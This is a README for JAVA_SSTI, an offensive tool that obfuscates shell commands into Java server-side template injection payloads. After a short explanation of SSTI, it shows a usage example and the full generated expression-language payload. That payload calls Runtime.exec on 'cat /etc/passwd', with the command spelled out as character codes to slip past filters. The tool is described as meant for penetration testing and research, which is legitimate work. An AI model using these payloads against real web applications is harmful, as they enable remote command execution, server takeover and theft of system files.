<p align="center">
   <img src="https://img.shields.io/badge/Version-v1.0-blue" alt="Version">
   <img src="https://img.shields.io/badge/License-GPL--3.0-brightgreen" alt="License">
</p>

## About

JAVA_SSTI assists the exploitation of Server-Side Template Injection vulnerabilities in java.
The tool and its test suite are developed to research the SSTI vulnerability class and to be used as offensive security tool during web application penetration tests.

What is server-side template injection?
A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.

## Documentation

### Usage options:
```Bash
  eval       Command for obfuscation, for example: 'cat /etc/passwd'
optional arguments:
  -h, --help     show help message
  -v, --verbose  increase verbosity
```

### Example:
```Bash
python3 java_ssti.py 'cat /etc/passwd'
```
```python
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## Developers

- [0xc7m](https://github.com/0xc7m)

## References
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java

## License

Project JAVA_SSTI is distributed under the GPL-3.0 license.
